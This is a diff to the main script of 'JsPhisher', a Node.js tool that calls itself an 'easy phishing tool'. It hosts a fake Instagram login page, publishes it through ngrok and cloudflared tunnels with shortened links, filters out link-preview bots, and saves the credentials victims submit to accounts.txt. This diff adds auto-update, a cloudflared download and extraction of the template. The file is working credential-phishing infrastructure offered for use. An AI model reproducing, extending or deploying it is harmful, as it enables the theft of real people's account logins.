@@ -1,9 +1,29 @@
+/**
+ * JsPhisher - Easy phishing tool
+ * Coded by: @gamerboytr
+ * Its a open-source project
+ */
+
 "use strict";
+try {
+	require("express");
+} catch (e) {
+	console.clear();
+	if (e.code !== "MODULE_NOT_FOUND") throw e;
+	console.log("You don't have node_modules installed.");
+	console.log("Installing dependencies...");
+	require("child_process").execSync("npm install");
+	console.log("Installed all dependencies.");
+}
 const express = require("express");
 const bodyParser = require("body-parser");
+const readlineSync = require("readline-sync");
 const geoip = require("geoip-lite");
 const chalk = require("chalk");
 const agentParser = require("ua-parser-js");
+const child_process = require("child_process");
+const downloader = require("download");
+const AdmZip = require("adm-zip");
 const axios = require("axios").default;
 const app = express();
 const port = process.env.PORT || process.env.NODE_PORT || 6969;
@@ -12,12 +32,14 @@ const short = require("./short");
 const path = require("path");
 const fs = require("fs");
 
-const VERSION = "1.0";
+const VERSION = "1.1";
+const isLinux = process.platform === "linux";
 const logAsk = chalk.greenBright`[{whiteBright ?}]`;
 const logSuccess = chalk.yellowBright`[{whiteBright √}]`;
-const logError = chalk.blueBright`[{whiteBright !}]`;
+const logError = chalk.redBright`[{whiteBright !}]`;
 const logInfo = chalk.yellowBright`[{whiteBright +}]`;
 const logInfo2 = chalk.greenBright`[{whiteBright •}]`;
+const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
 
 const logLogo =
 	chalk.red`       _     _____  _     _     _               \n` +
@@ -32,15 +54,18 @@ const logLogo =
 console.clear();
 console.log(logLogo);
 const loggedIps = [];
+if (process.platform === "darwin") {
+	console.log(chalk.redBright`${logError} You are running on a Mac. This is not supported.`);
+	process.exit(1);
+}
 
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, "util", "instagram")));
 
-console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
-
-const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
-
 (async () => {
+	await controlVersion();
+	await installRequirements();
+	console.log(chalk.magenta`${logInfo2} Initializing local server at localhost:${port}...\n`);
 	await new Promise(r =>
 		app.listen(port, _ => {
 			console.log(chalk.cyan`${logInfo} Local server has started successfully!\n`);
@@ -50,7 +75,7 @@ const botDetecter = /(Discordbot|bitlybot|facebookexternalhit)/gi;
 	console.log(chalk.magenta`${logInfo2} Initializing tunnelers at same address...\n`);
 	const ngrokSw = await ngrok.connect(port).catch(console.error);
 	const shortNgrok = await short(ngrokSw).catch(console.error);
-	const cloudflared = require("child_process").spawn("util\\cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
+	const cloudflared = child_process.spawn("util/cloudflared", ["tunnel", "--url", `http://localhost:${port}`]);
 	let cfUrl;
 	let cfShowed = false;
 	let cfReady = false;
@@ -119,3 +144,64 @@ app.post("/login", (req, res) => {
 	console.log(chalk.cyan`${logInfo} Saved in accounts.txt\n`);
 	console.log(chalk.cyan`${logInfo} Waiting for next... {cyanBright Press {red Ctrl+C} to exit}`);
 });
+
+//! Functions
+
+function controlVersion() {
+	return new Promise(async (resolve, reject) => {
+		const { data: readme } = await axios.get("https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/README.md").catch(reject);
+		const version = readme.match(/Version-(.*?)-green/)[1];
+		const changelogRequest = await axios.get(`https://raw.githubusercontent.com/gamerboytr/JsPhisher/master/CHANGELOG.md`).catch(() => {});
+		const changelog = changelogRequest?.data;
+		if (version !== VERSION) {
+			console.clear();
+			console.log(logLogo);
+			console.log(chalk.redBright`${logError} New version available!\n`);
+			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} Current version:  ${VERSION}`);
+			console.log(chalk.yellow`${chalk.cyan`[{cyanBright *}]`} New version:      ${version}\n`);
+			console.log(chalk.yellow`${logAsk} Do you want to update? {yellowBright (y/n)}`);
+			if (readlineSync.keyInYN("")) {
+				console.clear();
+				console.log(logLogo);
+				console.log(chalk.greenBright`${logSuccess} Updating...\n`);
+				console.log(chalk.yellow`${logInfo} Downloading repo...`);
+				child_process.execSync(`cd .. && ${isLinux ? "rm -rf JsPhisher" : "rmdir /S /Q JsPhisher"} && git clone https://github.com/gamerboytr/JsPhisher`);
+				console.log(chalk.yellow`${logInfo} Updated!\n`);
+				console.log(chalk.yellow`${logInfo} Please restart terminal manually.\n`);
+				if (changelog) {
+					console.log(chalk.yellow`${logInfo} Changelog:\n`);
+					console.log(chalk.yellow(changelog));
+				}
+				process.exit();
+			} else {
+				console.clear();
+				console.log(logLogo);
+				console.log(chalk.greenBright`${logSuccess} Using old version.\n`);
+			}
+		}
+		resolve();
+	});
+}
+
+function installRequirements() {
+	return new Promise(async (resolve, reject) => {
+		console.clear();
+		console.log(logLogo);
+		if (!fs.existsSync(path.join(__dirname, "util", `cloudflared${isLinux ? ".deb" : ".exe"}`))) {
+			console.log(chalk.yellow`${logInfo2} Downloading cloudflared...`);
+			let cloudflaredLink = `https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-${isLinux ? "linux" : "windows"}-`;
+			cloudflaredLink += isLinux && process.arch === "x64" ? "amd64.deb" : isLinux ? "386.deb" : "386.exe";
+			await downloader(cloudflaredLink, path.join(__dirname, "util"), { filename: `cloudflared${isLinux ? ".deb" : ".exe"}` }).catch(reject);
+			console.log(chalk.yellow`${logSuccess} Downloaded!\n`);
+		}
+		if (fs.existsSync(path.join(__dirname, "util", "instagram.zip"))) {
+			console.log(chalk.yellow`${logInfo2} Extracting instagram...`);
+			new AdmZip(path.join(__dirname, "util", "instagram.zip")).extractAllTo(path.join(__dirname, "util", "instagram"), true);
+			console.log(chalk.yellow`${logSuccess} Extracted!\n`);
+			console.log(chalk.yellow`${logInfo2} Removing instagram.zip...`);
+			fs.unlinkSync(path.join(__dirname, "util", "instagram.zip"));
+			console.log(chalk.yellow`${logSuccess} Removed!\n`);
+		}
+		resolve();
+	});
+}
